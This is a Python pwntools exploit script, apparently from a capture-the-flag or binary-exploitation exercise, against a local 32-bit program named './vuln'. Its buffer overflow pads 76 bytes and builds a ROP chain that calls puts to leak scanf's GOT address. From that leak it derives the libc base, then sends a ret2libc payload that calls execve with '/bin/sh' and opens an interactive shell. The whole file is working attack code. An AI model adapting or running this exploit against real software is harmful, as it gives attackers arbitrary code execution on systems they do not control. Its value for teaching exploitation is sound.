#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386')
p = 0
b = ELF('./vuln')
libc = ELF('/lib32/libc.so.6') # "info sharedlibrary" sous gdb pour conna√Ætre le chemin de votre libc
global p, libc, b

DEBUG = True

def wait(until):
    buf=p.recvuntil(until)
    if(DEBUG):
        print "[Debug] : " + buf
    return buf

pop_gadget = 0x08049022  # pop ebx ; ret (got using ROPgadget --binary <exec> | grep "pop ebx ; ret")
gotscanf = b.symbols['got.__isoc99_scanf'] # 0x804975c
pltputs = b.symbols['puts'] # 0x8048310 
addrmain = b.symbols['main'] # 0x8048477
input_msg = "Enter a string :"

if DEBUG == True:
    print "[Debug] : scanf@got : " + str(hex(gotscanf))
    print "[Debug] : puts@plt : " + str(hex(pltputs))
    print "[Debug] : main() address : " + str(hex(addrmain))

p = process('./vuln') # Starting program

wait(input_msg)

log.info("[Exploit] : Building ROPchain...")
payload = "a"*76
payload += p32(pltputs) 
payload += p32(pop_gadget) # pop ebx
payload += p32(gotscanf)
payload += p32(addrmain) 

log.info("[Exploit] : Sending ROPchain...")
p.sendline(payload) # Send the payload
leak = wait(input_msg)
leak_scanf = u32(leak[2:6])
log.success("[Exploit] : Leaked address of scanf() : " + str(hex(leak_scanf)))

leak_libc_base = leak_scanf - libc.symbols["__isoc99_scanf"]
log.success("[Exploit] : Leaked libc base : " + str(hex(leak_libc_base)))

"""
Now let's search for the system() address in libc
"""
leak_execve = leak_libc_base + libc.symbols['execve']
leak_system = leak_libc_base + libc.symbols['system']
leak_binsh = leak_libc_base + next(libc.search('/bin/sh\x00'))

log.success("[Exploit] : Leaked address of execve() : " + str(hex(leak_execve)))
log.success("[Exploit] : Leaked address of system() (not used) : " + str(hex(leak_system)))
log.success("[Exploit] : Leaked address /bin/sh in libc : " + str(hex(leak_binsh)))
log.info("[Exploit] : Building payload for ret2libc calling system")
payload = "a"*76
payload += p32(leak_execve)
payload += p32(pop_gadget) # pop ebx
payload += p32(leak_binsh)
payload += "\x00"*4
payload += "\x00"*4
log.info("[Exploit] : Sending payload...")

p.sendline(payload)

p.interactive()

p.close()
